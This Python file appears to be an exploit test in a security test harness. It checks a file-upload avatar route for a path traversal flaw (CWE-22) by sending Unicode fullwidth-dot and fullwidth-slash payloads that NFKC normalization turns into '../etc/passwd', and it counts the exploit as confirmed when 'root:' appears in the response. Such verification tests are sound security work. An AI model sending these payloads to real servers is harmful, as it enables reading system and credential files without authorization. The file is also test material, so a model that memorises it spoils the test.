"""FileUpload port: NFKC path traversal (CWE-22). Mirror of gin Diamond."""

from __future__ import annotations

from urllib.parse import quote

from mosaic.oracle.exploit import ExploitTest


_FW_DOT = "\uFF0E"
_FW_SLASH = "\uFF0F"


class FileuploadNfkcExploit(ExploitTest):
    @property
    def chain_id(self) -> str:
        return "fileupload_path_normalize_unicode"

    def execute(self) -> tuple[bool, str]:
        # Sanity check — can't know if any avatars exist, so hit ../ to confirm the guard
        blocked = self.http_get("/avatars/..%2Fetc%2Fpasswd")
        if blocked.status_code != 400:
            # If not 400, the route might not be installed or be using a different guard
            pass

        payload = f"{_FW_DOT*2}{_FW_SLASH}{_FW_DOT*2}{_FW_SLASH}etc{_FW_SLASH}passwd"
        r = self.http_get("/avatars/" + quote(payload, safe=""), follow_redirects=False)
        body = r.text or ""
        if "root:" in body:
            return True, f"NFKC traversal confirmed (fileupload, CWE-22). Body: {body[:200]!r}"

        payload2 = f"{_FW_DOT*2}{_FW_SLASH}etc{_FW_SLASH}passwd"
        r2 = self.http_get("/avatars/" + quote(payload2, safe=""), follow_redirects=False)
        if "root:" in (r2.text or ""):
            return True, f"NFKC traversal confirmed (shorter). Body: {r2.text[:200]!r}"

        return False, f"No traversal. statuses={r.status_code}/{r2.status_code}"
